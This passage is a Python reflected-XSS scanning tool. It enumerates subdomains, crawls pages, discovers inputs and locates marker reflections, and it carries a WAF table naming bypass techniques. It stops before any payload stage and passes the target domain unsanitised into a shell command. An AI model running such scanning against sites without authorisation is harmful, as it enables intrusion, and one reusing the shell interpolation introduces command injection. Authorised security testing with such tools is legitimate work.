#!/usr/bin/env python3

import argparse
import asyncio
import json
import re
import time
import os
import subprocess 
import random 
import base64 
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, unquote_plus, quote
from collections import deque
import html 

import httpx 
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError, Error as PlaywrightError
import tldextract 


class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    CYAN = '\033[96m'


DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0 RXSS-Framework/2.3" # Incremented version
DEFAULT_TIMEOUT = 25
CRAWL_DEPTH_DEFAULT = 2
MAX_CONCURRENT_REQUESTS = 6
SILENT_MODE = False
COMMON_API_PATTERNS = [
    r'/api/v[0-9]+(?:beta|alpha)?/', r'/api/', r'/rest/', r'/jsonrpc', r'/graphql',
    r'fetch\s*\(\s*[\'"`]([^\'"`#?]+).*?[\'"`]',
    r'axios\.(?:get|post|put|delete|request)\s*\(\s*[\'"`]([^\'"`#?]+).*?[\'"`]',
    r'XMLHttpRequest.*open\s*\([^,]+,\s*[\'"`]([^\'"`#?]+).*?[\'"`]',
    r'(?:const|let|var)\s+[a-zA-Z0-9_$]+\s*=\s*[\'"`](https?://[^\'"\s?#]+).*?[\'"`]',
    r'window\.location(?:href)?\s*=\s*[\'"`]([^\'"`#?]+).*?[\'"`]',
    r'\.setAttribute\s*\(\s*[\'"`](?:href|src|action|formaction)[\'"`]\s*,\s*[\'"`]([^\'"`#?]+).*?[\'"`]\s*\)',
    r'new\s+WebSocket\s*\(\s*[\'"`](wss?://[^\'"`]+)[\'"`]\s*\)',
]
HEADERS_TO_TEST_REFLECTION = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "X-Client-IP",
    "X-Custom-IP-Authorization", "True-Client-IP", "CF-Connecting-IP",
    "Forwarded", "From", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
    "Accept-Language", "X-WAP-Profile", "Contact", "Origin", "X-Requested-With"
]
COOKIES_TO_TEST_REFLECTION = [
    "sessionId", "userId", "lang", "pref", "trackingId", "vulnerableCookie", "debugUser", "csrfToken"
]
WAF_FINGERPRINTS = {
    "cloudflare": {"name": "Cloudflare", "blocks_alert": True, "common_techniques": ["event_handler_mutation", "unicode_escape", "string_splitting"]},
    "incapsula": {"name": "Incapsula", "blocks_script_tag": True, "common_techniques": ["broken_tag", "char_code_encoding", "alternative_tags"]},
    "aws waf": {"name": "AWS WAF", "common_techniques": ["case_mutation", "js_string_concat", "comment_bypass"]},
    "akamaighost": {"name": "Akamai", "common_techniques": ["html_entity_encoding", "url_encoding_variants"]},
    "sucuri": {"name": "Sucuri CloudProxy", "common_techniques": ["mixed_encoding", "data_uri_bypass"]},
    "barracuda": {"name": "Barracuda", "common_techniques": ["keyword_splitting", "null_byte"]},
    "f5 big-ip": {"name": "F5 BIG-IP", "common_techniques": ["double_encoding", "svg_payloads"]},
}


def print_info(message):
    if not SILENT_MODE:
        print(f"{Colors.CYAN}[*] {message}{Colors.ENDC}")
def print_success(message): print(f"{Colors.GREEN}[+] {message}{Colors.ENDC}")
def print_warning(message):
    if not SILENT_MODE:
        print(f"{Colors.YELLOW}[!] {message}{Colors.ENDC}")
def print_error(message): print(f"{Colors.RED}[-] {message}{Colors.ENDC}")
def sanitize_filename(url_or_domain): return re.sub(r'[^a-zA-Z0-9_-]', '_', url_or_domain)[:100]
def make_dict_hashable(d): return tuple(sorted(d.items()))
def js_string_escape(s):
    """Escapes a string for safe embedding in a JavaScript string literal."""
    return json.dumps(s)[1:-1] 



class SubdomainEnumerator:
    def __init__(self, target_domain, timeout=DEFAULT_TIMEOUT):
        self.target_domain = target_domain; self.timeout = timeout; self.subdomains = set()

    async def _fetch_crtsh(self, session):
        print_info(f"Querying crt.sh for {self.target_domain}...")
        url = f"https://crt.sh/?q=%.{self.target_domain}&output=json"
        try:
            response = await session.get(url, timeout=self.timeout)
            response.raise_for_status(); data = response.json()
            initial_count = len(self.subdomains)
            for entry in data:
                name_value = entry.get("name_value", "")
                if name_value:
                    for sub in name_value.split('\n'):
                        sub = sub.strip().lower()
                        if sub.endswith(f".{self.target_domain}") and not sub.startswith("*.") and sub != self.target_domain: self.subdomains.add(sub)
            found_count = len(self.subdomains) - initial_count
            if found_count > 0: print_success(f"Found {found_count} new potential subdomains from crt.sh.")
        except Exception as e: print_warning(f"crt.sh query failed for {self.target_domain}: {e}")

    async def _run_subfinder(self):
        print_info(f"Running subfinder for {self.target_domain}...")
        try:
            process = await asyncio.create_subprocess_shell(
                f"subfinder -d {self.target_domain} -silent -timeout {self.timeout}",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await process.communicate()
            if process.returncode != 0: print_warning(f"Subfinder exited with error code {process.returncode}: {stderr.decode().strip()}"); return
            if stdout:
                found_subs = stdout.decode().strip().split('\n'); count = 0
                for sub in found_subs:
                    sub = sub.strip().lower()
                    if sub and sub.endswith(f".{self.target_domain}") and sub != self.target_domain:
                        if sub not in self.subdomains: self.subdomains.add(sub); count +=1
                if count > 0: print_success(f"Found {count} new potential subdomains from subfinder.")
        except FileNotFoundError: print_warning("subfinder command not found. Skipping. Please install it for better results.")
        except Exception as e: print_error(f"Error running subfinder: {e}")

    async def _scrape_search_engines(self, session):
        print_info(f"Attempting basic DuckDuckGo scraping for {self.target_domain}...")
        try:
            ddg_url = f"https://html.duckduckgo.com/html/?q=site%3A{self.target_domain}"
            headers = {'User-Agent': DEFAULT_USER_AGENT, 'Accept-Language': 'en-US,en;q=0.5'}
            response = await session.get(ddg_url, headers=headers, timeout=self.timeout, follow_redirects=True)
            response.raise_for_status(); content = response.text
            found_in_ddg = set(re.findall(r'https?://([a-zA-Z0-9.-]+\.' + re.escape(self.target_domain) + ')', content))
            count = 0
            for sub_full_domain in found_in_ddg:
                sub = tldextract.extract(sub_full_domain).subdomain
                if sub:
                    full_sub = f"{sub}.{self.target_domain}"
                    if full_sub not in self.subdomains and full_sub != self.target_domain: self.subdomains.add(full_sub.lower()); count +=1
            if count > 0: print_success(f"Found {count} potential new subdomains from DuckDuckGo.")
        except Exception as e: print_warning(f"DuckDuckGo scraping failed: {e}")

    async def _check_dns_http(self, subdomain, session):
        urls_to_check = [f"https://{subdomain}", f"http://{subdomain}"]
        for url_scheme in urls_to_check:
            try:
                response = await session.head(url_scheme, timeout=self.timeout / 2, follow_redirects=True, headers={'User-Agent': DEFAULT_USER_AGENT})
                if 200 <= response.status_code < 500:
                    print_success(f"Validated live subdomain: {Colors.BOLD}{url_scheme}{Colors.ENDC}{Colors.GREEN} (Status: {response.status_code}){Colors.ENDC}")
                    return subdomain
            except (httpx.RequestError, httpx.Timeout): pass
            except Exception: pass
        return None

    async def enumerate(self):
        print_info(f"Starting subdomain enumeration for {Colors.BOLD}{self.target_domain}{Colors.ENDC}")
        async with httpx.AsyncClient(verify=False) as session:
            await asyncio.gather(self._fetch_crtsh(session), self._run_subfinder(), self._scrape_search_engines(session))
            if not self.subdomains: print_warning(f"No potential subdomains found for {self.target_domain} before validation."); return []
            print_info(f"Validating {len(self.subdomains)} potential subdomains...")
            validated_subdomains = set(); tasks = [self._check_dns_http(sub, session) for sub in list(self.subdomains)]
            semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS * 2)
            async def run_with_semaphore(task):
                async with semaphore: return await task
            results = await asyncio.gather(*(run_with_semaphore(task) for task in tasks), return_exceptions=True)
            for result in results:
                if isinstance(result, Exception): print_warning(f"Validation task failed: {result}")
                elif result: validated_subdomains.add(result)
            self.subdomains = validated_subdomains
            print_success(f"Subdomain Enumeration: Found {Colors.BOLD}{len(self.subdomains)}{Colors.ENDC}{Colors.GREEN} live subdomains.{Colors.ENDC}")
        return list(self.subdomains)

# --- JS-Aware Crawler ---
class Crawler:
    def __init__(self, initial_urls, depth=CRAWL_DEPTH_DEFAULT, playwright_instance=None, target_domain_registered_part=None):
        self.initial_urls = initial_urls if isinstance(initial_urls, list) else [initial_urls]
        self.depth = depth; self.visited_urls = set(); self.discovered_endpoints = set()
        self.playwright = playwright_instance; self.target_domain_registered_part = target_domain_registered_part
        self._browser_instance = None; self._own_playwright_instance = False

    async def _get_playwright_page(self, context_options=None):
        if not self._browser_instance or not self._browser_instance.is_connected():
            if not self.playwright: self.playwright = await async_playwright().start(); self._own_playwright_instance = True
            else: self._own_playwright_instance = False
            self._browser_instance = await self.playwright.chromium.launch(headless=True)
        ctx_opts = {'user_agent': DEFAULT_USER_AGENT, 'ignore_https_errors': True}
        if context_options: ctx_opts.update(context_options)
        context = await self._browser_instance.new_context(**ctx_opts)
        page = await context.new_page()
        return page, context

    async def _close_playwright_resources(self, page=None, context=None):
        if page: await page.close()
        if context: await context.close()

    async def _extract_from_js_content(self, page_url_for_context, js_content):
        for pattern in COMMON_API_PATTERNS:
            try:
                matches = re.finditer(pattern, js_content, re.IGNORECASE | re.MULTILINE)
                for match in matches:
                    url_path_candidate = next((g for g in match.groups() if g), match.group(0))
                    if not url_path_candidate or len(url_path_candidate) < 3: continue
                    url_path_candidate = url_path_candidate.strip('\'"`').strip()
                    if url_path_candidate.startswith(('http://', 'https://', '//', '/', './', '../')):
                        abs_url = urljoin(page_url_for_context, url_path_candidate)
                        parsed_abs_url = urlparse(abs_url)
                        clean_url = parsed_abs_url._replace(query="", fragment="").geturl()
                        if self.target_domain_registered_part and tldextract.extract(clean_url).registered_domain != self.target_domain_registered_part: continue
                        endpoint_type = 'js_api_endpoint' if any(api_sig in clean_url.lower() for api_sig in ['/api', '/rest', '/json', '/xml', '/graphql']) else 'js_extracted_url'
                        params_info_tuple = make_dict_hashable({'type': endpoint_type, 'source_js': page_url_for_context[:100]})
                        if self.discovered_endpoints.add(('GET', clean_url, params_info_tuple)):
                             print_info(f"JS Extract ({endpoint_type}): {clean_url} from {page_url_for_context}")
            except Exception as e: print_warning(f"Regex error processing JS for URL/API (pattern: {pattern}): {e}")

    async def _extract_shadow_dom_forms(self, page, current_url):
        shadow_hosts_selectors = ['*']
        for selector in shadow_hosts_selectors:
            try:
                shadow_host_elements = await page.query_selector_all(selector)
                for host_el in shadow_host_elements:
                    is_shadow_host = await host_el.evaluate("el => el.shadowRoot !== null")
                    if is_shadow_host:
                        forms_in_shadow = await host_el.query_selector_all(">>> form")
                        if forms_in_shadow:
                            print_info(f"Found {len(forms_in_shadow)} forms in Shadow DOM under <{await host_el.evaluate('el => el.tagName.toLowerCase()')}> on {current_url}")
                            for form_handle in forms_in_shadow:
                                action = await form_handle.get_attribute("action")
                                method = (await form_handle.get_attribute("method") or "GET").upper()
                                form_url = urljoin(current_url, action) if action else current_url
                                param_names = [await inp.get_attribute("name") for inp in await form_handle.query_selector_all(">>> input[name], >>> textarea[name], >>> select[name]")]
                                param_names_tuple = tuple(sorted([p for p in param_names if p]))
                                original_fields_dict = {p: 'RXSSFrameworkTestValue' for p in param_names_tuple}
                                form_params_info = make_dict_hashable({
                                    'type': 'form_shadow_dom',
                                    'params': param_names_tuple,
                                    'host_tag': await host_el.evaluate('el => el.tagName.toLowerCase()'),
                                    'original_fields': make_dict_hashable(original_fields_dict)
                                })
                                self.discovered_endpoints.add((method, form_url, form_params_info))
                                print_info(f"Found Shadow DOM form: {method} {form_url} with params: {list(param_names_tuple)}")
            except Exception as e:
                print_warning(f"Error processing shadow DOM for selector '{selector}' on {current_url}: {e}")


    async def _process_page_for_crawl(self, page, current_url, current_depth, queue):
        links = await page.eval_on_selector_all("a[href]", "elements => elements.map(el => el.href)")
        for link in links:
            if not link or link.startswith(("mailto:", "tel:", "javascript:")): continue
            absolute_link = urljoin(current_url, link)
            if self.target_domain_registered_part and tldextract.extract(absolute_link).registered_domain != self.target_domain_registered_part: continue
            if absolute_link not in self.visited_urls: queue.append((absolute_link, current_depth + 1))

        forms = await page.query_selector_all("form")
        for form_handle in forms:
            action = await form_handle.get_attribute("action"); method = (await form_handle.get_attribute("method") or "GET").upper()
            form_url = urljoin(current_url, action) if action else current_url
            param_names = [await inp.get_attribute("name") for inp in await form_handle.query_selector_all("input[name], textarea[name], select[name]")]
            param_names_tuple = tuple(sorted([p for p in param_names if p]))
            original_fields_dict = {p: 'RXSSFrameworkTestValue' for p in param_names_tuple}
            form_params_info = make_dict_hashable({
                'type': 'form',
                'params': param_names_tuple,
                'original_fields': make_dict_hashable(original_fields_dict)
            })
            self.discovered_endpoints.add((method, form_url, form_params_info))
            print_info(f"Found form: {method} {form_url} with params: {list(param_names_tuple)}")

        await self._extract_shadow_dom_forms(page, current_url)

        event_handler_attributes = ["onload", "onerror", "onclick", "onmouseover", "onfocus", "onsubmit", "onchange", "onblur", "onkeyup", "onkeydown", "onkeypress", "ondblclick", "onmousedown", "onmouseup", "onmousemove", "onmouseout", "onselect", "ontoggle"]
        for attr_name in event_handler_attributes:
            elements_with_handler = await page.query_selector_all(f"[{attr_name}]")
            if elements_with_handler:
                print_info(f"Found {len(elements_with_handler)} elements with '{attr_name}' handler on {current_url}")
                event_params_info = make_dict_hashable({'type': 'inline_event_handler', 'handler_type': attr_name, 'source_url': current_url})
                self.discovered_endpoints.add(('EVENT_HANDLER_PAGE', current_url, event_params_info))

        script_elements = await page.query_selector_all("script")
        for script_el in script_elements:
            src = await script_el.get_attribute("src")
            js_content_source_url = current_url
            if src:
                js_url = urljoin(current_url, src); js_content_source_url = js_url
                if self.target_domain_registered_part and tldextract.extract(js_url).registered_domain != self.target_domain_registered_part: continue
                try:
                    async with httpx.AsyncClient(verify=False) as client:
                        response = await client.get(js_url, timeout=DEFAULT_TIMEOUT, headers={'User-Agent': DEFAULT_USER_AGENT})
                        response.raise_for_status(); js_content = response.text
                        await self._extract_from_js_content(js_content_source_url, js_content)
                except Exception as e: print_warning(f"Failed to fetch/parse external JS {js_url}: {e}")
            else:
                js_content = await script_el.inner_text()
                if js_content: await self._extract_from_js_content(js_content_source_url + "#inline_script", js_content)

        try:
            local_storage = await page.evaluate("() => JSON.stringify(localStorage)")
            session_storage = await page.evaluate("() => JSON.stringify(sessionStorage)")
            if local_storage and local_storage != '{}':
                ls_keys = list(json.loads(local_storage).keys())
                ls_params_info = make_dict_hashable({'type': 'localStorage_keys', 'keys': tuple(sorted(ls_keys))})
                self.discovered_endpoints.add(('LOCAL_STORAGE', current_url, ls_params_info))
                print_info(f"Found localStorage items on {current_url}: {ls_keys}")
            if session_storage and session_storage != '{}':
                ss_keys = list(json.loads(session_storage).keys())
                ss_params_info = make_dict_hashable({'type': 'sessionStorage_keys', 'keys': tuple(sorted(ss_keys))})
                self.discovered_endpoints.add(('SESSION_STORAGE', current_url, ss_params_info))
                print_info(f"Found sessionStorage items on {current_url}: {ss_keys}")
        except Exception as e: print_warning(f"Could not extract localStorage/sessionStorage from {current_url}: {e}")

    async def crawl_all(self):
        page = None; context = None; queue = deque()
        for u in self.initial_urls:
            if not self.target_domain_registered_part: self.target_domain_registered_part = tldextract.extract(u).registered_domain
            queue.append((u, 0))
        try:
            page, context = await self._get_playwright_page()
            while queue:
                current_url, current_depth = queue.popleft()
                if current_url in self.visited_urls or current_depth > self.depth: continue
                print_info(f"Crawling (Depth {current_depth}): {Colors.BOLD}{current_url}{Colors.ENDC}")
                self.visited_urls.add(current_url)
                parsed_current_url = urlparse(current_url)
                url_crawl_params_info = make_dict_hashable({'type': 'url_crawl'})
                self.discovered_endpoints.add(('GET', parsed_current_url._replace(fragment="").geturl(), url_crawl_params_info))
                try:
                    await page.goto(current_url, timeout=DEFAULT_TIMEOUT * 1000, wait_until="networkidle")
                    await asyncio.sleep(random.uniform(2.5, 4.0))
                    await self._process_page_for_crawl(page, current_url, current_depth, queue)
                except PlaywrightTimeoutError: print_warning(f"Timeout crawling {current_url}")
                except PlaywrightError as pe: print_error(f"Playwright error crawling {current_url}: {pe}"); await self._close_playwright_resources(page, context); page, context = await self._get_playwright_page()
                except Exception as e: print_error(f"General error crawling {current_url}: {e}"); await self._close_playwright_resources(page, context); page, context = await self._get_playwright_page()
        finally:
            await self._close_playwright_resources(page, context)
            if self._browser_instance and self._browser_instance.is_connected(): await self._browser_instance.close()
            if self._own_playwright_instance and self.playwright: await self.playwright.stop(); self.playwright = None
        return list(self.discovered_endpoints)


class InputDiscoverer:
    def __init__(self, endpoints, custom_headers=None, custom_cookies=None):
        self.endpoints = endpoints; self.input_vectors = []; self.custom_headers = custom_headers or {}; self.custom_cookies = custom_cookies or {}

    async def discover(self, playwright_instance):
        print_info("Starting Input Vector Discovery...")
        for method, url, params_info_tuple in self.endpoints:
            params_info = dict(params_info_tuple)
            original_form_fields_hashable = params_info.get('original_fields', make_dict_hashable({}))
            original_form_fields = dict(original_form_fields_hashable)

            parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query)
            for p_name, p_values in query_params.items():
                for p_value in p_values: self.input_vectors.append({'method': 'GET', 'url': url, 'param_name': p_name, 'param_type': 'query', 'original_value': p_value})
            path_segments = [segment for segment in parsed_url.path.split('/') if segment]
            for i, segment in enumerate(path_segments):
                if re.search(r'\d', segment) or segment.lower() in ['id', 'user', 'page', 'item', 'product', 'api', 'v1', 'v2', 'search', 'query', 'token', 'key']:
                    self.input_vectors.append({'method': 'GET', 'url': url, 'param_name': f'path_segment_{i}', 'param_type': 'path', 'original_value': segment})

            if params_info.get('type') in ['form', 'form_shadow_dom']:
                for p_name in params_info.get('params', []):
                    self.input_vectors.append({'method': method, 'url': url, 'param_name': p_name, 'param_type': 'form_field', 'original_value': 'RXSSFrameworkTestValue', 'all_form_fields': original_form_fields})
            elif params_info.get('type') == 'localStorage_keys':
                for key_name in params_info.get('keys', []): self.input_vectors.append({'method': 'CLIENT_STORAGE', 'url': url, 'param_name': key_name, 'param_type': 'localStorage', 'original_value': 'RXSSFrameworkTestLSValue'})
            elif params_info.get('type') == 'sessionStorage_keys':
                for key_name in params_info.get('keys', []): self.input_vectors.append({'method': 'CLIENT_STORAGE', 'url': url, 'param_name': key_name, 'param_type': 'sessionStorage', 'original_value': 'RXSSFrameworkTestSSValue'})
            if method in ["POST", "PUT"] and params_info.get('type') not in ['form', 'form_shadow_dom', 'localStorage_keys', 'sessionStorage_keys']:
                self.input_vectors.append({'method': method, 'url': url, 'param_name': 'json_body_generic_key', 'param_type': 'json_key', 'original_value': 'RXSSFrameworkTestValue'})

        for header_name in HEADERS_TO_TEST_REFLECTION: self.input_vectors.append({'method': 'ANY', 'url': '*', 'param_name': header_name, 'param_type': 'header', 'original_value': 'RXSSFrameworkTestHeader'})
        for header_name, header_value in self.custom_headers.items(): self.input_vectors.append({'method': 'ANY', 'url': '*', 'param_name': header_name, 'param_type': 'header', 'original_value': header_value})
        for cookie_name in COOKIES_TO_TEST_REFLECTION: self.input_vectors.append({'method': 'ANY', 'url': '*', 'param_name': cookie_name, 'param_type': 'cookie', 'original_value': 'RXSSFrameworkTestCookie'})
        for cookie_name, cookie_value in self.custom_cookies.items(): self.input_vectors.append({'method': 'ANY', 'url': '*', 'param_name': cookie_name, 'param_type': 'cookie', 'original_value': cookie_value})
        self.input_vectors.append({'method': 'GET', 'url': '*', 'param_name': 'url_fragment', 'param_type': 'fragment', 'original_value': 'RXSSFrameworkTestFragment'})
        self.input_vectors.append({'method': 'CLIENT_EVENT', 'url': '*', 'param_name': 'postMessage_data', 'param_type': 'postMessage', 'original_value': 'RXSSFrameworkTestPostMessage'})
        print_success(f"Input Discovery: Found {Colors.BOLD}{len(self.input_vectors)}{Colors.ENDC}{Colors.GREEN} potential input vectors.{Colors.ENDC}")
        return self.input_vectors


class ReflectionEngine:
    def __init__(self, playwright_instance):
        self.playwright = playwright_instance; self.unique_marker_base = f"rxssFwMarker{int(time.time())}"
        self.marker_counter = 0; self._browser_instance = None; self._own_playwright_instance = False

    async def _get_playwright_page_ctx(self, context_options=None):
        if not self._browser_instance or not self._browser_instance.is_connected():
            if not self.playwright: self.playwright = await async_playwright().start(); self._own_playwright_instance = True
            else: self._own_playwright_instance = False
            self._browser_instance = await self.playwright.chromium.launch(headless=True)
        ctx_opts = {'user_agent': DEFAULT_USER_AGENT, 'ignore_https_errors': True}
        if context_options: ctx_opts.update(context_options)
        context = await self._browser_instance.new_context(**ctx_opts); page = await context.new_page()
        return page, context

    async def _close_playwright_resources(self, page=None, context=None):
        if page: await page.close()
        if context: await context.close()

    async def _check_reflection_context(self, page, marker, test_url):
        content = await page.content()
        if marker not in content: return None
        print_info(f"Marker '{marker}' reflected in raw HTML for {test_url}")
        context_type = "UNKNOWN"; raw_html_snippet = content[max(0, content.find(marker)-100) : content.find(marker)+len(marker)+100]
        tag_name = "N/A"; attribute_name = "N/A"; dom_path = "N/A"
        try:
            escaped_marker_for_js_eval = js_string_escape(marker) 
            js_get_dom_path_script = f"""
            (markerToFind) => {{
                function getDomPath(el) {{
                    if (!el) return 'N/A_ELEMENT_NOT_FOUND_IN_GETDOMPATH';
                    if (typeof el.getDomPath === 'function') return el.getDomPath();
                    var stack = [];
                    while (el.parentNode != null) {{
                        var sibCount = 0; var sibIndex = 0;
                        for (var i = 0; i < el.parentNode.childNodes.length; i++) {{
                            var sib = el.parentNode.childNodes[i];
                            if (sib.nodeName == el.nodeName) {{
                                if (sib === el) {{ sibIndex = sibCount; break; }}
                                sibCount++;
                            }}
                        }}
                        var nodeName = el.nodeName.toLowerCase();
                        if (el.id) {{ stack.unshift(nodeName + '#' + el.id); break; }}
                        else if (sibCount > 0 && el.parentNode.childNodes.length > 1) {{ stack.unshift(nodeName + ':nth-of-type(' + (sibIndex + 1) + ')'); }}
                        else {{ stack.unshift(nodeName); }}
                        el = el.parentNode;
                    }}
                    return stack.join(' > ');
                }}
                var foundElement = Array.from(document.querySelectorAll('*')).find(e => e.outerHTML.includes(markerToFind));
                if (foundElement) {{
                    return getDomPath(foundElement);
                }}
                return 'N/A_ELEMENT_NOT_FOUND_BY_JS';
            }}
            """
            try:
                dom_path_result = await page.evaluate(js_get_dom_path_script, marker) # Pass marker as argument
                if dom_path_result and dom_path_result != 'N/A_ELEMENT_NOT_FOUND_BY_JS': dom_path = dom_path_result; print_info(f"DOM Path (experimental) for marker '{marker}': {dom_path}")
            except Exception as e_dom_path: print_warning(f"Could not evaluate JS for DOM path: {e_dom_path}")

            elements_with_marker = await page.locator(f"*:text-is('{marker}')").all()
            if not elements_with_marker: elements_with_marker = await page.locator(f"*:has-text('{marker}')").all()

            if elements_with_marker:
                
                outer_htmls = []
                for el_handle in elements_with_marker:
                    try:
                        outer_htmls.append(await el_handle.evaluate("e => e.outerHTML"))
                    except Exception: 
                        outer_htmls.append("") 

                if not any(outer_htmls): 
                     print_warning(f"Could not get outerHTML for any element containing marker '{marker}'.")
                else:
                    
                    min_len = float('inf')
                    best_el_index = -1
                    for i, oh in enumerate(outer_htmls):
                        if oh and len(oh) < min_len: 
                            min_len = len(oh)
                            best_el_index = i

                    if best_el_index != -1:
                        element_containing_marker = elements_with_marker[best_el_index]
                        outer_html = outer_htmls[best_el_index]
                        inner_html = await element_containing_marker.evaluate("element => element.innerHTML")
                        tag_name = await element_containing_marker.evaluate("element => element.tagName.toLowerCase()")
                        raw_html_snippet = outer_html[:250] + "..." if len(outer_html) > 250 else outer_html

                        if tag_name == "script" and marker in inner_html: context_type = "JAVASCRIPT_BLOCK"
                        elif f"" in content.replace(" ", "") or f"" in content: context_type = "HTML_COMMENT"
                        elif re.search(fr"""\s(?:[a-zA-Z0-9_-]+)=(['"]){re.escape(marker)}\1""", outer_html):
                            context_type = "HTML_ATTRIBUTE_VALUE_QUOTED"; attr_match = re.search(fr"""\s([a-zA-Z0-9_-]+)=(['"]){re.escape(marker)}\1""", outer_html)
                            if attr_match: attribute_name = attr_match.group(1)
                        elif re.search(fr"""\s(?:[a-zA-Z0-9_-]+)=({re.escape(marker)})(?:\s|>)""", outer_html):
                            context_type = "HTML_ATTRIBUTE_VALUE_UNQUOTED"; attr_match = re.search(fr"""\s([a-zA-Z0-9_-]+)=({re.escape(marker)})(?:\s|>)""", outer_html)
                            if attr_match: attribute_name = attr_match.group(1)
                        elif f">{marker}<" in outer_html.replace(" ", ""): context_type = "HTML_TEXT"
                        elif tag_name in ["textarea", "title", "style"] and marker in inner_html:
                            context_type = "HTML_TAG_CONTENT_SPECIAL";
                            if tag_name == "style": context_type = "CSS_CONTEXT_IN_STYLE_TAG"
                        elif marker in inner_html: context_type = "HTML_TAG_CONTENT_GENERIC"
                        if context_type == "JAVASCRIPT_BLOCK" or (context_type.startswith("HTML_ATTRIBUTE_VALUE") and attribute_name.lower().startswith("on")):
                            if re.search(fr"""(['"`])(?:(?!\1).)*{re.escape(marker)}(?:(?!\1).)*\1""", inner_html if tag_name == "script" else outer_html): context_type = "JAVASCRIPT_STRING"
            else:
                context_type = "UNKNOWN_NO_LOCATOR_MATCH"
                if f"" in content.replace(" ", ""): context_type = "HTML_COMMENT"
                elif f"<script>[^<]*{marker}[^<]*</script>" in content: context_type = "JAVASCRIPT_BLOCK"
            print_success(f"Reflection context for {marker}: {Colors.BOLD}{context_type}{Colors.ENDC}{Colors.GREEN} (Tag: <{tag_name}>, Attr: {attribute_name}, DOM Path: {dom_path}){Colors.ENDC}")
            return context_type, raw_html_snippet, tag_name, attribute_name, dom_path
        except PlaywrightTimeoutError: print_warning(f"Playwright timeout locating marker {marker} on page {test_url}.")
        except Exception as e_locator: print_warning(f"Could not precisely locate marker {marker} on {test_url}: {e_locator}")
        if marker in content:
            if f"" in content.replace(" ", ""): context_type = "HTML_COMMENT"
            print_success(f"Reflection context for {marker} (fallback): {Colors.BOLD}{context_type}{Colors.ENDC}")
            return context_type, raw_html_snippet, tag_name, attribute_name, dom_path
        return None

    async def check_reflection(self, vector, base_target_url):
        self.marker_counter += 1; marker = f"{self.unique_marker_base}{self.marker_counter}"
        page = None; context = None; reflected_info = None
        try:
            current_target_url = base_target_url if vector['url'] == '*' else vector['url']
            if not current_target_url: print_warning(f"Skipping reflection check: missing target URL for {vector}"); return None
            parsed_target_url = urlparse(current_target_url); test_url = current_target_url
            request_method = vector['method']; request_data_post = None; request_headers = {}; context_options = {}
            all_form_fields = vector.get('all_form_fields', {}) 

            if vector['param_type'] == 'query':
                request_method = 'GET'; query_params = parse_qs(parsed_target_url.query)
                query_params[vector['param_name']] = [marker]; new_query = urlencode(query_params, doseq=True)
                test_url = parsed_target_url._replace(query=new_query).geturl()
            elif vector['param_type'] == 'path':
                request_method = 'GET'; path_parts = list(filter(None, parsed_target_url.path.split('/')))
                try:
                    segment_index = int(vector['param_name'].split('_')[-1])
                    if 0 <= segment_index < len(path_parts):
                        path_parts[segment_index] = marker; new_path = "/" + "/".join(path_parts)
                        if parsed_target_url.path.endswith('/') and not new_path.endswith('/'): new_path += '/'
                        test_url = parsed_target_url._replace(path=new_path).geturl()
                    else: return None
                except (ValueError, IndexError): return None
            elif vector['param_type'] == 'form_field':
                if request_method == 'GET':
                    query_params = parse_qs(parsed_target_url.query); temp_form_data = {**all_form_fields, vector['param_name']: marker}
                    new_query = urlencode(temp_form_data, doseq=True); test_url = parsed_target_url._replace(query=new_query).geturl()
                elif request_method == 'POST': request_data_post = {**all_form_fields, vector['param_name']: marker}
                else: print_warning(f"Form field reflection for method {request_method} not fully implemented.")
            elif vector['param_type'] == 'json_key':
                request_method = 'POST'; request_data_post = json.dumps({vector['param_name']: marker, "anotherKey": "test"})
                request_headers['Content-Type'] = 'application/json'
            elif vector['param_type'] == 'header': request_headers[vector['param_name']] = marker
            elif vector['param_type'] == 'cookie': context_options['extra_http_headers'] = {'Cookie': f"{vector['param_name']}={marker}"}
            elif vector['param_type'] == 'fragment': test_url = parsed_target_url._replace(fragment=marker).geturl()
            elif vector['param_type'] in ['localStorage', 'sessionStorage']: request_method = 'GET'
            elif vector['param_type'] == 'postMessage': print_warning("postMessage reflection testing is a placeholder."); return None
            else: print_warning(f"Reflection check for param_type '{vector['param_type']}' not implemented."); return None

            print_info(f"Testing reflection for {Colors.BOLD}{vector['param_name']}{Colors.ENDC} ({vector['param_type']}) in {current_target_url} with marker {marker}")
            page, context = await self._get_playwright_page_ctx(context_options=context_options)
            if request_headers: await context.set_extra_http_headers(request_headers)

            if vector['param_type'] in ['localStorage', 'sessionStorage']:
                storage_type = vector['param_type']; key_name = vector['param_name']
                await page.evaluate(f"window.{storage_type}.setItem('{key_name}', '{marker}');")
                await page.goto(test_url, timeout=DEFAULT_TIMEOUT * 1000, wait_until="networkidle")
            elif request_method in ['POST', 'PUT'] and request_data_post:
                if vector['param_type'] == 'form_field' and request_method == 'POST':
                    form_html_fields = "".join([f"<input type='hidden' name='{k}' value='{v}'>" for k,v in request_data_post.items()])
                    form_html = f"<form id='rxssForm' action='{test_url}' method='POST'>{form_html_fields}</form><script>document.getElementById('rxssForm').submit();</script>"
                    await page.set_content(form_html, wait_until="networkidle")
                elif vector['param_type'] == 'json_key':
                    async with httpx.AsyncClient(verify=False) as client:
                        http_response = await client.request(request_method, test_url, content=request_data_post, headers=request_headers, timeout=DEFAULT_TIMEOUT)
                        content_after_post = http_response.text
                        if marker in content_after_post: await page.goto(current_target_url, timeout=DEFAULT_TIMEOUT * 1000, wait_until="networkidle")
                        else: return None
                else: await page.goto(test_url, timeout=DEFAULT_TIMEOUT * 1000, wait_until="networkidle")
            else: await page.goto(test_url, timeout=DEFAULT_TIMEOUT * 1000, wait_until="networkidle")
            await asyncio.sleep(1.5)

            context_details_tuple = await self._check_reflection_context(page, marker, test_url)
            if context_details_tuple:
                context_type, raw_html_snippet, tag_name, attribute_name, dom_path = context_details_tuple
